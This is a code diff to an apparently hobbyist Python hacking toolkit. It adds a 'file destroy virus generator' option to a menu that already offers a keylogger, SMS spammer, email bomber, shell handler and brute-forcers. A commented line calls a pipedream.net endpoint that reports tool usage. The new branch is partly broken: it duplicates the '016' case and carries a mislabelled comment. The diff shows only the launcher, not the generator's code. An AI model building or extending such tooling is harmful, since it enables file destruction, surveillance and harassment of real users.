@@ -76,6 +76,9 @@ def fun_expdb():
 def fun_metbrute():
  os.system('python sigTool/met_dir.py')
  
+def fun_filevirus():
+ os.system('python sigTool/v_gen.py')
+ 
 # game
 def fun_game1():
  #requests.get(f'https://eovzlu8cd49gpu1.m.pipedream.net/?tool=Game1:{list55}')
@@ -112,7 +115,7 @@ def fun1():
     |[002] directory bruteforce              [014] simple shell handler         |
     |[003] keylogger local machine           [015] email bomber                 |
     |[004] sms spammer                       [016] http methods dir bruteforcer |
-    |[005] status checker                    [017]                              |
+    |[005] status checker                    [017] file destroy virus generator |
     |[006] multi dns digger                  [018]                              |
     |[007] dns record finder                 [019]                              |
     |[008] xss tester [file_input]           [020] exploit-db dumper            |
@@ -257,6 +260,13 @@ def fun1():
    fun_metbrute()
   elif inp=='016':
    fun_metbrute()
+
+# HTTP Methods bruteforcer
+  elif inp=='system call 017':
+   print(colored("                         FILE DESTROYER VIRUS GENERATOR MODE [ON]","blue"))
+   fun_filevirus()
+  elif inp=='016':
+   fun_filevirus()
    
 # Exploit dumper   
   elif inp=='system call 020':
